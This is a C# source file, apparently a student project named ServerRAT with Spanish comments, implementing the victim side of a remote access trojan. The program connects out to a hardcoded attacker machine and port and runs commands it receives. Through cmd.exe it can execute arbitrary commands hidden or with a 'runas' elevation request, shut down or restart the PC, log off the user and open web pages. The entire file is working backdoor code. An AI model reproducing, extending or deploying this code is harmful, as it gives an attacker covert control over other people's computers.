using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;

/**-----------ESTA VERSION CONTIENE CAMBIOS EN setconnecto(string name) 16/7/2018-----
 * Este programa es el que recibe los mensajes y ejecuta los comandos requeridos
 * Reenviar informacion?
 * Main machine name: DESKTOP-5EI3CAG(Universidad). También puede ser : Bunker-1, PC de torre
 * */
namespace ServerRAT
{
    class Program
    {
        #region Atributos
        public static TcpClient client;
        public static int port = 32742;//puerto de comunicacion entre las maquinas (por defecto 32742)
        public static string connectTo = "192.168.0.102";//ip del atacante
        public static IPAddress ipaddress = null;
        public static Thread getMessages = new Thread(readMessage);
        public static NetworkStream dataStream;
        public static char[] separator = "/".ToCharArray();//":" separa el comando
        public static string MainMachineName = "DESKTOP-5EI3CAG";//Por defecto uso la maquina de la universidad jaja
        public static bool networkAvailabilty = System.Net.NetworkInformation.NetworkInterface.GetIsNetworkAvailable(); //Disponibilidad de red
        #endregion

        //No me acuerdo para que era esto jaja
        static int getIndex(byte[] buffer)
        {
            int i = 0;
            for (; i < buffer.Length; i++)
            {
                if (buffer[i] == 0x00) { break; }
            }
            return i;
        }
        //Analiza y ejecuta un comando segun el mensaje recibido
        static void analyzeMessage(string msg)
        {
            try
            {
                string[] temp = msg.Split(separator);

                string command = temp[0];
                string data = temp[1];
                //Imprimo lo recibido por el atacante
                Console.WriteLine(">Recived: '" + msg + "' from Port " + port + " at " + DateTime.Now.ToString());

                switch (command)
                {
                    case ("msg")://Imprimo un mensaje en consola
                        Console.WriteLine(data);
                        break;
                    case ("endconnection")://finalizo la aplicacion de la víctima
                        Environment.Exit(1);
                        break;
                    case ("alert msg")://Globo de alerta con mensaje   
                        MessageBox.Show(data, "Alert", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation);
                        break;
                    case ("cmda")://Admin, Not Hidden
                        ExecuteCMD(data, true, false);
                        break;
                    case ("cmdh")://No admin, Hidden
                        ExecuteCMD(data, false, true);
                        break;
                    case ("cmd")://No admin, Not Hidden
                        ExecuteCMD(data, false, false);
                        break;
                    case ("getip")://Ips de la victima
                        //responset.sendMessage(localips());
                        break;
                    case ("connectip")://Conecta a [ip de pc atacante]
                        setConnectToIP(data);
                        break;
                    case ("connectname")://Conecta a [nombre de pc en red]
                        setConnectTo(data);
                        break;
                    case ("setport")://Setea un nuevo puerto 
                        setport(Convert.ToInt32(data));
                        break;
                    case ("shutdown")://Apaga la PC con X tiempo, No Admin, Hidden. Data es el tiempo antes de que se apague(puede ser cero)
                        ExecuteCMD("shutdown /s /t " + data, false, true);
                        break;
                    case ("cancelshutdown"):
                        ExecuteCMD("shutdown /a", false, true);
                        break;
                    case ("logoffuser")://Cierra sesion del usuario
                        ExecuteCMD("shutdown /l", false, true);
                        break;
                    case ("restart")://Reinicia PC de la vitima en X segundos
                        ExecuteCMD("shutdown /r /t"+data, false, true);
                        break;
                    case ("openWE")://Abre Windows Explorer
                        ExecuteCMD("start ."+ data, false, true);                       
                        break;
                    case ("openweb")://Abre navegador predeterminado con data como página
                        ExecuteCMD("start " + data, false, true);
                        break;
                    case ("cmdfile")://Ejecuta un comando y guarda la salida en escritorio
                        ExecuteCMD(data + ">> c:/Users/usuario/Desktop/dross.txt",false, true);
                        break;

                }                                             
            }
            catch (Exception ex) { }



        }
        //Lee los mensajes recibidos
        static void readMessage()
        {
            string temp = "";
            while (true)
            {
                if (dataStream.DataAvailable == true)
                {
                    byte[] buffer = new byte[1048];
                    dataStream.Read(buffer, 0, buffer.Length);
                    int cutAt = getIndex(buffer);
                    for (int i = 0; i < cutAt; i++)
                    {
                        temp+= (char)buffer[i];
                    }
                    analyzeMessage(temp);
                    temp = string.Empty;

                }
                

            }
        }
        //Main
        static void Main(string[] args)
        {
            Console.WriteLine("Started at " + DateTime.Now.ToString());
            setConnectTo(MainMachineName);//Seteo que se conecte a mi PC
            bool isValidIp = IPAddress.TryParse(connectTo, out ipaddress);
            if (isValidIp == false)
            {
                Console.WriteLine("Recived Invalid Ip \nTrying second method...");
                ipaddress = Dns.GetHostAddresses(connectTo)[0];
                Console.WriteLine(Dns.GetHostAddresses(connectTo)[0]);               
            }
            
            client = new TcpClient();
            Console.WriteLine("Recived Valid Ip \nTrying to connect...");
            do
            {
                try
                {                    
                    client.Connect(ipaddress, port);
                    dataStream = client.GetStream();
                    getMessages.Start();
                }
                catch (Exception ex) { }
            } while (client.Connected != true);

            Console.WriteLine("Connection Successful: " + connectTo + " at port " + port);
        }
        //Ejecutar comandos en CMD
        public static void ExecuteCMD(string comm, bool admin, bool hidden)
        {

            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            //Execute hidden or not
            if (hidden) { startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden; }
            else { startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Maximized; }  
                      
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = "/C " + comm;

            if (admin == true) startInfo.Verb = "runas";

            process.StartInfo = startInfo;
            try
            {
                process.Start();
            }
            catch (Exception ex) { }
        }
        //Ver Ips de esta maquina       
        public static string localips()
        {
            string ips = "";
            String strHostName = string.Empty;
            // Getting Ip address of local machine...
            // First get the host name of local machine.
            strHostName = Dns.GetHostName();
            ips += "Victim Machine's Host Name: " + strHostName + "\n";
            // Then using host name, get the IP address list..
            IPHostEntry ipEntry = Dns.GetHostEntry(strHostName);
            IPAddress[] addr = ipEntry.AddressList;

            for (int i = 0; i < addr.Length; i++)
            {
                ips += "Ip adress[" + i + "]: " + addr[i] + "\n";
            }

            return ips;
        }
        //Cambia la IP del atacante segun el nombre de la maquina del atacante (por defecto mi pc de la universidad)  
        //Si la PC victima no es la misma que la del atacante, ejecutara la exepcion
        //Lo que sucede es que, si estoy ejecutando el programa en otra máquina, addr solo tiene longitud de 1
        //Sin embargo, si ejecuto este codigo en la misma PC del atacante, addr tiene logitud 4       
        public static void setConnectTo(String name)
        {
            Console.WriteLine("Searching Ipv4 of: " + name + "...");
            // Then using host name, get the IP address list..
            IPHostEntry ipEntry = Dns.GetHostEntry(name);
            IPAddress[] addr = ipEntry.AddressList;
            foreach (IPAddress ip in addr)
            {
                try
                {
                    if (ip.ToString().Contains("192.168"))
                    {
                        Console.WriteLine("Ipv4 found = " + ip.ToString());
                        connectTo = ip.ToString();
                    }
                }
                catch (Exception ex) { Console.WriteLine(">No valid Ipv4 found for " + name); }

            }                        
        }
        //Cambia la ip de connectTo segun una ip
        public static void setConnectToIP(string ip)
        {
            Console.WriteLine("Changing Ip: " + connectTo + " to " + ip);
            connectTo = ip;
            Console.WriteLine("Successful change");
        }
        //Cambio el puerto de comuniacion
        public static void setport(int _port)
        {
            Console.WriteLine("Changing port: " + port + " to " + _port);
            port = _port;
            Console.WriteLine("Successful change");
        }
        //Imprime si esta maqina esta conectada a internet
        public static void getNetworkAvailability() { Console.WriteLine("Network availability: " + networkAvailabilty); }

    }
}
